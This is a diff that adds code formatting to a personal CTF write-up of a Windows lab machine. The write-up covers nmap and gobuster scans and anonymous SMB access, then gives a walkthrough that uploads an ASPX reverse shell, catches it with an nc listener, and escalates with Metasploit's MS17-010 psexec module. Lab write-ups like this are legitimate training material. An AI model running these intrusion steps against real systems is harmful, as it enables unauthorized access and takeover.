@@ -16,12 +16,15 @@ Additionally, the client has provided the following scope allowances:
 
 so,i'll document all that i find here, let's go
 
+~~~bash
 $ export ip=10.10.226.137
 $ echo $ip
-
+~~~
 first i did scan the ip with nmap
 
+~~~
 # sudo nmap -sS -p- 10.10.226.137 -T4 -vv
+~~~
 
 i use 'sS' flag to do a SYN scan to discover wich ports are open, -p- to scan all ports, -T4 to make the can faster and -vv to verbose output
 
@@ -39,7 +42,9 @@ PORT      STATE SERVICE       REASON
 
 while i'm going to scan more deeper those ports that are open
 
+~~~
 # sudo nmap -sC -A -p80,135,139,445,3389,49663,49667,49669 10.10.226.137 -T4 -vv
+~~~
 
 i used a -sC flag to default script's from nmap,-A: Enable OS detection, version detection, script scanning, and traceroute and -T4 and -vv flags that i explained above
 
@@ -49,7 +54,9 @@ it's a web page from IIS Windows server with a few welcome messages and if you c
 
 i'm going to fuzz the directories in this webserver with gobuster...
 
+~~~
 $ gobuster dir -u $ip -w /usr/share/wordlists/wordlists/directory_scanner/directory_list_2.3_medium.txt -x js,txt,php
+~~~
 
 while the scanner run,i'm will take a look in the result from nmap
 
@@ -67,7 +74,9 @@ https://hackernoon.com/an-introductory-guide-to-hacking-netbios-bq2w34ay
 
 i got a session service running in netbios service with the nmap scan, i'll try to enumerate this with the flag --script in nmap
 
+~~~
 # nmap -sV -v --script nbstat.nse $ip
+~~~
 
 i don't find anything interesint so, i'm going try connect without pass and user
 
@@ -80,7 +89,7 @@ ok, and the smb server in port 445,it's worth a try!
 i've enumerate this port and got this information
 
 
-		Sharename       Type      Comment
+        Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
@@ -89,12 +98,14 @@ i've enumerate this port and got this information
 
 ok,let's try connect in server
 
+~~~
 $ smbclient //$ip/nt4wrksv -p 445 -U ""
-
+~~~
 it worked!
 
 ok, i got a passwords.txt file 
 
+~~~
 $ get passwords.txt
 $ cat passwords.txt                                                              
 '''                                      
@@ -102,6 +113,7 @@ $ cat passwords.txt
 pass1
 pass2
 '''
+~~~
 
 i won't show this here because this room says that writeups are not allowed,so...
 
@@ -113,10 +125,12 @@ https://dencode.com
 
 after that i run a scanner in msf6 and...
 
+~~~
 $ msfconsole
 $ use scanner/smb/smb_ms17_010
 $ set RHOSTS $ip
 $ run 
+~~~
 
 Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard Evaluation 14393 x64 (64-bit)
 
@@ -127,7 +141,9 @@ update:  I lost a big part of what i do after this because of a problem in my OS
 
 the one thing that i found is that can access the files in webserver
 
+~~~
 $ curl http://$ip:49663/nt4wrksv/passwords.txt
+~~~
 
 i tried to up a php shell but doesn't returns anything for me,so , i don't know ....
 
@@ -165,7 +181,9 @@ i learned about 'potatoes' too and how they escalated privileges with tokens and
 
 they potatoes doesn't work anymore but it's possible make it with spoofer and using pipe's too
 
+~~~
 $ whoami /priv 
+~~~
 
 i execute this and found some interesting things
 
@@ -213,12 +231,13 @@ now a resume how to beat this room
 ### User Flag
 
 - connect to smb server
+~~~
 $ export ip= 
 $ smbclient \\\\$ip\\nt4wrksv 
-
+~~~
 - upload shell or any file you want 
 link: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
-
+~~~
 $ put shell.aspx
 
 $ nc -lvnp 1234
@@ -228,10 +247,10 @@ $ curl http://$ip:49663/nt4wrksv/shell.aspx -v
 $ cd c:\Users\Bob\Desktop
 
 $ type user.txt
-
+~~~
 
 ### Root Flag
-
+~~~
 $ msfconsole 
 
 $ use windows/smb/ms17_010_psexec
@@ -254,6 +273,6 @@ $ run
 $ cd c:\Users\Administrator\Desktop\
 
 $ cat root.txt # if you use meterpreter :)
-
+~~~
 
 
